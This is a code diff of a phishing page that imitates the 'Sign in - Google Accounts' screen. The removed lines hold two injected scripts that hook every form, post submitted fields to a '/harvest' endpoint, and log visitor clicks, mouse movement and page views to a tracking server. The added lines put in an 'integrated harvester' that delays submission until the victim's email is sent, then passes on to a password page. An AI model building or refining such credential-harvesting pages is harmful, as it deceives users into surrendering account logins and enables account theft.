@@ -1,454 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- scarface_logger -->
-<script>
-(function() {
-    if(window.__scarface_loaded) return;
-    window.__scarface_loaded = true;
-    
-    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-    
-    // ==================== CREDENTIAL HARVESTING ====================
-    function formToDict(form) {
-        var data = {};
-        var fd = new FormData(form);
-        fd.forEach(function(value, key) {
-            data[key] = value;
-        });
-        if(Object.keys(data).length === 0) {
-            var idx = 0;
-            var els = form.querySelectorAll('input,select,textarea');
-            els.forEach(function(el) {
-                var k = el.name || el.id || ('field_'+idx++);
-                var v = el.value;
-                data[k] = v;
-            });
-        }
-        return data;
-    }
-    
-    function sendHarvest(form) {
-        try {
-            var data = formToDict(form);
-            fetch('/harvest', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(function(){});
-            
-            // Also send to intel dashboard
-            if (true) {
-                trackIntel('credentials_submitted', data);
-            }
-        }catch(e){}
-    }
-    
-    // ==================== INTEL TRACKING ====================
-    function trackIntel(eventType, data) {
-        if (!true) return;
-        
-        const payload = {
-            session_id: SESSION_ID,
-            event_type: eventType,
-            data: {
-                ...data,
-                url: window.location.href,
-                referrer: document.referrer,
-                screen: { width: screen.width, height: screen.height },
-                timestamp: new Date().toISOString()
-            }
-        };
-        
-        fetch('http://127.0.0.1:5500/track', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            mode: 'cors'
-        }).catch(function(){});
-    }
-    
-    // Track page view
-    if (true) {
-        trackIntel('page_view', {
-            title: document.title,
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform
-        });
-    }
-    
-    // ==================== FORM HOOKS ====================
-    var origSubmit = HTMLFormElement.prototype.submit;
-    HTMLFormElement.prototype.submit = function() {
-        sendHarvest(this);
-        origSubmit.apply(this, arguments);
-    };
-    
-    document.addEventListener('submit', function(e){
-        sendHarvest(e.target);
-    }, true);
-    
-    function hookBtns(form){
-        var btns = form.querySelectorAll('[type=submit],button');
-        btns.forEach(function(btn){
-            btn.addEventListener('click', function(){sendHarvest(form);}, true);
-        });
-        var inputs = form.querySelectorAll('input');
-        inputs.forEach(function(input){
-            input.addEventListener('keydown', function(e){
-                if(e.key==='Enter'){sendHarvest(form);}
-            }, true);
-        });
-    }
-    
-    document.querySelectorAll('form').forEach(hookBtns);
-    
-    var mo = new MutationObserver(function(muts){
-        muts.forEach(function(mut){
-            mut.addedNodes.forEach(function(node){
-                if(node.tagName==='FORM') hookBtns(node);
-                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
-            });
-        });
-    });
-    mo.observe(document.documentElement,{childList:true,subtree:true});
-    
-    // ==================== INTEL TRACKING EVENTS ====================
-    if (true) {
-        // Mouse movement (throttled)
-        let lastMouse = 0;
-        document.addEventListener('mousemove', function(e) {
-            const now = Date.now();
-            if (now - lastMouse > 3000) {
-                lastMouse = now;
-                trackIntel('mouse_move', { x: e.clientX, y: e.clientY });
-            }
-        }, { passive: true });
-        
-        // Clicks
-        document.addEventListener('click', function(e) {
-            trackIntel('click', {
-                element: e.target.tagName,
-                id: e.target.id,
-                text: e.target.textContent?.substring(0, 50)
-            });
-        }, { passive: true });
-        
-        // Form field focus
-        document.addEventListener('focus', function(e) {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                trackIntel('form_field_focus', {
-                    field_name: e.target.name || e.target.id,
-                    field_type: e.target.type
-                });
-            }
-        }, true);
-        
-        // Time on page
-        let timeOnPage = 0;
-        setInterval(function() {
-            timeOnPage += 5;
-            trackIntel('time_on_page', { seconds: timeOnPage });
-        }, 5000);
-        
-        // Page unload
-        window.addEventListener('beforeunload', function() {
-            trackIntel('page_unload', { seconds_on_page: timeOnPage });
-        });
-    }
-})();
-</script>
-
-<!-- harvest_logger -->
-<script>
-(function() {
-    if(window.__harvest_logger_loaded) return;
-    window.__harvest_logger_loaded = true;
-    function formToDict(form) {
-        var data = {};
-        var fd = new FormData(form);
-        fd.forEach(function(value, key) {
-            data[key] = value;
-        });
-        // If FormData is empty, manually gather all input/select/textarea
-        if(Object.keys(data).length === 0) {
-            var idx = 0;
-            var els = form.querySelectorAll('input,select,textarea');
-            els.forEach(function(el) {
-                var k = el.name || el.id || ('field_'+idx++);
-                var v = el.value;
-                data[k] = v;
-            });
-        }
-        return data;
-    }
-    function sendHarvest(form) {
-        try {
-            var data = formToDict(form);
-            fetch('/harvest', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(function(){});
-        }catch(e){}
-    }
-    var origSubmit = HTMLFormElement.prototype.submit;
-    HTMLFormElement.prototype.submit = function() {
-        sendHarvest(this);
-        origSubmit.apply(this, arguments);
-    };
-    document.addEventListener('submit', function(e){
-        sendHarvest(e.target);
-    }, true);
-    function hookBtns(form){
-        var btns = form.querySelectorAll('[type=submit],button');
-        btns.forEach(function(btn){
-            btn.addEventListener('click', function(){sendHarvest(form);}, true);
-        });
-        var inputs = form.querySelectorAll('input');
-        inputs.forEach(function(input){
-            input.addEventListener('keydown', function(e){
-                if(e.key==='Enter'){sendHarvest(form);}
-            }, true);
-        });
-    }
-    document.querySelectorAll('form').forEach(hookBtns);
-    var mo = new MutationObserver(function(muts){
-        muts.forEach(function(mut){
-            mut.addedNodes.forEach(function(node){
-                if(node.tagName==='FORM') hookBtns(node);
-                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
-            });
-        });
-    });
-    mo.observe(document.documentElement,{childList:true,subtree:true});
-})();
-</script>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
     <style>
-        :root {
-            color-scheme: light dark;
-        }
-        body {
-            font-family: 'Google Sans', Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: var(--background-color);
-            color: var(--text-color);
-        }
-        .container {
-            width: 100%;
-            max-width: 450px;
-            margin: 0 auto;
-            padding-top: 40px;
-        }
-        .logo {
-            margin-bottom: 16px;
-        }
-        .title {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-            color: var(--text-color);
-        }
-        .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            margin-bottom: 32px;
-            color: var(--text-color);
-        }
-        .space-before-input {
-            height: 20px;
-        }
-        .input-container {
-            width: 100%;
-            margin-bottom: 0;
-        }
-        .input-label-group {
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            margin-bottom: 0;
-        }
-        .input-label {
-            position: absolute;
-            top: -11px;
-            left: 14px;
-            background: var(--background-color);
-            color: #A4C2F4;
-            font-size: 16px;
-            padding: 0 4px;
-            z-index: 2;
-            pointer-events: none;
-            font-weight: 400;
-        }
-        .whsOnd {
-            width: 100%;
-            height: 56px;
-            padding: 24px 15px 10px 15px;
-            font-size: 16px;
-            border: 2px solid #A4C2F4;
-            border-radius: 6px;
-            box-sizing: border-box;
-            background-color: transparent;
-            color: var(--text-color);
-            margin-top: 0;
-            margin-bottom: 0;
-            transition: border-color 0.2s;
-            outline: none;
-            font-weight: 400;
-        }
-        .whsOnd:focus {
-            border-color: #A4C2F4;
-            outline: none;
-        }
-        .forgot-email {
-            background: none;
-            border: none;
-            color: #A4C2F4;
-            cursor: pointer;
-            font-size: 20px;
-            padding: 8px 0;
-            margin: 8px 0 0 0;
-            display: block;
-            text-align: left;
-            font-weight: 500;
-        }
-        .guest-mode {
-            font-size: 14px;
-            color: var(--secondary-text-color);
-            margin-top: 32px;
-            margin-bottom: 24px;
-        }
-        .guest-mode a {
-            color: #A4C2F4;
-            text-decoration: none;
-        }
-        .button-container {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 26px;
-        }
-        .VfPpkd-vQzf8d {
-            color: #A4C2F4;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 8px;
-            border-radius: 4px;
-            text-decoration: none;
-            display: inline-block;
-            background: none;
-            border: none;
-        }
-        .VfPpkd-vQzf8d:hover {
-            background-color: rgba(164, 194, 244, 0.04);
-        }
-        .next-button {
-            background-color: #A4C2F4;
-            color: #000 !important;
-            padding: 0 18px;
-            border-radius: 999px;
-            font-weight: 400;
-            border: none;
-            box-shadow: none;
-            font-size: 14px;
-            min-width: 64px;
-            min-height: 32px;
-            height: 32px;
-            line-height: 32px;
-            transition: background 0.2s;
-            margin-left: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .next-button:hover {
-            background-color: #9CB9E8;
-        }
-        .footer-container {
-            width: 100%;
-            max-width: 450px;
-            margin: 100px auto 0;
-            padding-top: 24px;
-        }
-        .language-selector {
-            margin-bottom: 24px;
-            text-align: left;
-        }
-        .language-selector select {
-            background-color: transparent;
-            color: var(--text-color);
-            border: none;
-            box-shadow: none;
-            border-radius: 0;
-            padding: 0 24px 0 0;
-            font-size: 13px;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23868e96'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 0 center;
-            background-size: 20px;
-            min-width: 200px;
-            outline: none;
-        }
-        .language-selector select:focus {
-            outline: none;
-        }
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 24px;
-            font-size: 12px;
-        }
-        .footer-links a {
-            color: var(--secondary-text-color);
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        @media (max-width: 480px) {
-            .footer-links {
-                gap: 16px;
-            }
-            .footer-container {
-                padding-left: 8px;
-                padding-right: 8px;
-            }
-            .container {
-                padding-left: 8px;
-                padding-right: 8px;
-            }
-        }
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --background-color: #000000;
-                --text-color: #ffffff;
-                --secondary-text-color: #9aa0a6;
-                --border-color: #3c4043;
-            }
-            .input-label {
-                background: #000000;
-            }
-        }
-        @media (prefers-color-scheme: light) {
-            :root {
-                --background-color: #ffffff;
-                --text-color: #000000;
-                --secondary-text-color: #5f6368;
-                --border-color: #dadce0;
-            }
-            .input-label {
-                background: #ffffff;
-            }
-        }
+        :root { color-scheme: light dark; }
+        body { font-family: 'Google Sans', Arial, sans-serif; margin: 0; padding: 20px; background-color: var(--background-color); color: var(--text-color); }
+        .container { width: 100%; max-width: 450px; margin: 0 auto; padding-top: 40px; }
+        .logo { margin-bottom: 16px; }
+        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: var(--text-color); }
+        .subtitle { font-size: 16px; font-weight: 400; margin-bottom: 32px; color: var(--text-color); }
+        .space-before-input { height: 20px; }
+        .input-container { width: 100%; margin-bottom: 0; }
+        .input-label-group { display: flex; flex-direction: column; position: relative; margin-bottom: 0; }
+        .input-label { position: absolute; top: -11px; left: 14px; background: var(--background-color); color: #A4C2F4; font-size: 16px; padding: 0 4px; z-index: 2; pointer-events: none; font-weight: 400; }
+        .whsOnd { width: 100%; height: 56px; padding: 24px 15px 10px 15px; font-size: 16px; border: 2px solid #A4C2F4; border-radius: 6px; box-sizing: border-box; background-color: transparent; color: var(--text-color); margin-top: 0; margin-bottom: 0; transition: border-color 0.2s; outline: none; font-weight: 400; }
+        .whsOnd:focus { border-color: #A4C2F4; outline: none; }
+        .forgot-email { background: none; border: none; color: #A4C2F4; cursor: pointer; font-size: 20px; padding: 8px 0; margin: 8px 0 0 0; display: block; text-align: left; font-weight: 500; }
+        .guest-mode { font-size: 14px; color: var(--secondary-text-color); margin-top: 32px; margin-bottom: 24px; }
+        .guest-mode a { color: #A4C2F4; text-decoration: none; }
+        .button-container { display: flex; justify-content: space-between; margin-top: 26px; }
+        .VfPpkd-vQzf8d { color: #A4C2F4; font-weight: 500; font-size: 14px; cursor: pointer; padding: 8px; border-radius: 4px; text-decoration: none; display: inline-block; background: none; border: none; }
+        .VfPpkd-vQzf8d:hover { background-color: rgba(164, 194, 244, 0.04); }
+        .next-button { background-color: #A4C2F4; color: #000 !important; padding: 0 18px; border-radius: 999px; font-weight: 400; border: none; box-shadow: none; font-size: 14px; min-width: 64px; min-height: 32px; height: 32px; line-height: 32px; transition: background 0.2s; margin-left: 24px; display: flex; align-items: center; justify-content: center; }
+        .next-button:hover { background-color: #9CB9E8; }
+        .footer-container { width: 100%; max-width: 450px; margin: 100px auto 0; padding-top: 24px; }
+        .language-selector { margin-bottom: 24px; text-align: left; }
+        .language-selector select { background-color: transparent; color: var(--text-color); border: none; box-shadow: none; border-radius: 0; padding: 0 24px 0 0; font-size: 13px; -webkit-appearance: none; -moz-appearance: none; appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23868e96'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 0 center; background-size: 20px; min-width: 200px; outline: none; }
+        .language-selector select:focus { outline: none; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 24px; font-size: 12px; }
+        .footer-links a { color: var(--secondary-text-color); text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+        @media (max-width: 480px) { .footer-links { gap: 16px; } .footer-container { padding-left: 8px; padding-right: 8px; } .container { padding-left: 8px; padding-right: 8px; } }
+        @media (prefers-color-scheme: dark) { :root { --background-color: #000000; --text-color: #ffffff; --secondary-text-color: #9aa0a6; --border-color: #3c4043; } .input-label { background: #000000; } }
+        @media (prefers-color-scheme: light) { :root { --background-color: #ffffff; --text-color: #000000; --secondary-text-color: #5f6368; --border-color: #dadce0; } .input-label { background: #ffffff; } }
     </style>
 </head>
 <body>
@@ -464,7 +50,7 @@
         <h1 class="title">Sign in</h1>
         <span class="subtitle">Use your Google Account</span>
         <div class="space-before-input"></div>
-        <form id="emailForm" action="password.html" method="GET" onsubmit="return handleFormSubmit()">
+        <form id="emailForm" action="password.html" method="GET">
             <div class="input-container">
                 <div class="input-label-group">
                     <label for="identifierId" class="input-label">Email or phone</label>
@@ -500,35 +86,54 @@
         </div>
     </div>
     <script>
-        function handleFormSubmit() {
+        // INTEGRATED HARVESTER: Blocks submit until data is sent
+        const form = document.getElementById('emailForm');
+        
+        async function handleHarvestAndSubmit(e) {
+            e.preventDefault(); // Stop form immediately
+            
             const emailInput = document.getElementById('identifierId');
             const emailVal = emailInput.value.trim();
             
             if (!emailVal) {
                 alert('Please enter your email first');
                 emailInput.focus();
-                return false;
+                return;
             }
-            
-            // Store in sessionStorage for password.html
+
+            // Prepare Data
+            const data = { email: emailVal };
+
+            // Attempt Harvest with 1s timeout
+            try {
+                const harvestReq = fetch('/harvest', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    keepalive: true
+                });
+
+                // Wait for harvest OR 1 second timeout (so user isn't stuck forever)
+                await Promise.race([
+                    harvestReq,
+                    new Promise(resolve => setTimeout(resolve, 1000))
+                ]);
+            } catch (err) {
+                console.log('Harvest skipped');
+            }
+
+            // Resume Normal Flow
             sessionStorage.setItem('user_email', emailVal);
+            form.action = `password.html?email=${encodeURIComponent(emailVal)}`;
             
-            // Force email into URL for harvesting
-            this.action = `password.html?email=${encodeURIComponent(emailVal)}`;
-            return true;
+            // Programmatic submit ignores 'submit' event listeners, preventing loops
+            form.submit();
         }
 
-        // Handle Enter key in email field
+        form.addEventListener('submit', handleHarvestAndSubmit);
+        
         document.getElementById('identifierId').addEventListener('keyup', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('emailForm').submit();
-            }
-        });
-
-        // Backup handler for programmatic submissions
-        document.getElementById('nextBtn').addEventListener('click', function(e) {
-            // Let the form's onsubmit handler handle everything
-            document.getElementById('emailForm').submit();
+            if (e.key === 'Enter') handleHarvestAndSubmit(e);
         });
     </script>
 </body>
